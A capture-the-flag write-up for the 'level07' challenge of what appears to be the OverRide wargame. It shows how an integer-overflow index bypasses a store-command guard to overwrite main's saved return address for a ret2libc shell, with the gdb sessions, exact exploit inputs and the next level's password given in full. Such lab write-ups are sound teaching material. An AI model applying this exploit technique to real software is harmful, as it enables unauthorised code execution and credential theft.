# Level07

## Analysis

Here comes a big boy, we have a number management system in front of us, we can use either "store", "read" or "quit".

- "store" will store a number at an asked index
- "read" will read a number at the asked index

Numbers are stored inside a fixed array in the stack located in `main()`.

As usual you can find the decomp [here](./level07.c).

## Exploit

What we can understand from this program is that "store" will allow us to write almost anything at _almost_ every memory address.

From this, we could imagine overwriting `%eip` and use it to do a RET2LIBC exploit.

First step is to get the `%eip` address, since there are multiple functions in this program (so multiple stack frame), we need to decide which `%eip` to overwrite. The smartest option being using the one from `main()` because we can chose to jump to it whenever we want by using the "quit" command:

```bash
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) i f
Stack level 0, frame at 0xffffdc30:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffdc28, args: 
 Locals at 0xffffdc28, Previous frame's sp is 0xffffdc30
 Saved registers:
  ebp at 0xffffdc28, eip at 0xffffdc2c
(gdb)
```

So our `%eip` is `0xffffdc2c`.

Moreover, we need to get the address of our buffer where the command "store" is writing to calculate the offset to `%eip`:

```bash
Breakpoint 2, 0x080486dd in read_number ()
(gdb) x/x $ebp+8
0xffffda40:	0xffffda64
```

So the offset is: `abs(0xffffda64 - 0xffffdc2c) = 456`

Which we will divide by 4 to give us the index: 456 / 4 = 114 (1 index == 4 bytes)

In theory we could write to `%eip` using "store" at the index 114, however there is a protection:

```c
if ( v3 == 3 * (v3 / 3) || HIBYTE(unum) == 183 )
```

The first condition prevents us from writing to an index divisible by 3, the second one checks if the second highest bytes are equal to `0xb7`.

To circumvent this issue, since `get_unum()` returns a `uint` and our index can range from `0` to `4 294 967 295`. What's interesting from this is the following line used to set our value at the specified index:

```c
*(_DWORD *)(a1 + 4 * v3) = unum;
```

`a1` is the beginning of our buffer, `v3` is the specified index.

Since we multiply our index by 4, we can overflow `UINT_MAX` to get the desired index which was previously impossible to access because of the protections we mentioned above. This gives us the following formula:

`((UINT_MAX + 1) / 4) + index`

In our case: `((4 294 967 295 + 1) / 4) + 114` => `1073741824 + 114` => `1073741938`

Hence why storing from index `1073741938` is equivalent to `114` while bypassing the protection:

### Demonstration

```bash
Input command: store 
 Number: 42069     
 Index: 1073741938    
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42069
 Completed read command successfully
Input command: 
```

# 

## RET2LIBC

To achieve our exploit, we will now need to get the address of `system()` and the string `"/bin/sh"` which are both contained in the libc.

First, system:

```bash
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb)
```

`system: 0xf7e6aed0`, to decimal => `4159090384`

Now "/bin/sh":

```bash
(gdb) info proc map
process 1935
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) 
```

`"/bin/sh": 0xf7f897ec`, to decimal => `4160264172`

We now need to write those values to the right place:

<details>
  <summary>Spoiler</summary>

  ```bash
  level07@OverRide:~$ ./level07 
  ----------------------------------------------------
  Welcome to wil's crappy number storage service!   
  ----------------------------------------------------
  Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
  ----------------------------------------------------
   wil has reserved some storage :>                 
  ----------------------------------------------------

  Input command: store 
    Number: 4159090384
    Index: 1073741938
  Completed store command successfully
  Input command: store 
    Number: 4160264172
    Index: 116
  Completed store command successfully
  Input command: quit
  $ whoami
  level08
  $ cat /home/users/level08/.pass
  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
  ```

</details>
